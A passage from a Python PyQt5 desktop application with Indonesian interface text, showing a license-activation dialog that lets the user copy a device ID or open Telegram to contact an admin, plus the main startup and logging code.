        f"Device ID Anda: {device_id}\n\n"
        "Silakan salin ID Perangkat Anda dan kirim ke admin via Telegram untuk aktivasi."
    )
    msg.setStandardButtons(QMessageBox.Ok | QMessageBox.Retry)
    msg.button(QMessageBox.Ok).setText("Buka Telegram")
    msg.button(QMessageBox.Retry).setText("Salin Device ID")
    msg.setStyleSheet("""
        QMessageBox { background-color: #1A1A2E; color: #EAEAEA; }
        QLabel { color: #EAEAEA; }
        QPushButton {
            background-color: #4A00E0;
            color: white;
            border: 1px solid #8E2DE2;
            padding: 5px;
            min-width: 90px;
        }
        QPushButton:hover { background-color: #8E2DE2; }
    """)

    result = msg.exec_()

    if result == QMessageBox.Ok:
        webbrowser.open(TELEGRAM_LINK)
    elif result == QMessageBox.Retry:
        clipboard = app.clipboard()
        clipboard.setText(device_id)
        QMessageBox.information(None, "Tersalin", f"Device ID {device_id} telah disalin ke clipboard.")

    sys.exit(1)

def main():
    app = QApplication(sys.argv)
    
    is_valid, message = check_license()
    if not is_valid:
        # Jika perangkat tidak terdaftar, langsung tampilkan dialog aktivasi
        if "tidak terdaftar" in message or "Tidak dapat memverifikasi" in message:
            device_id = get_device_id()
            show_license_activation_dialog(device_id, message)
        else: # Untuk error lain (koneksi, maintenance, expired)
            msg = QMessageBox()
            msg.setIcon(QMessageBox.Critical)
            msg.setWindowTitle("Error Lisensi")
            msg.setText(message)
            msg.setInformativeText("Aplikasi akan ditutup. Hubungi admin jika masalah berlanjut.")
            msg.setStandardButtons(QMessageBox.Ok)
            msg.exec_()
        sys.exit(1)

    window = MainWindow()
    window.show()
    sys.exit(app.exec_())

if __name__ == '__main__':
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s [%(levelname)s] %(message)s',
        handlers=[
            logging.FileHandler("app_log.txt"),
            logging.StreamHandler(sys.stdout)
        ]
    )
    main()
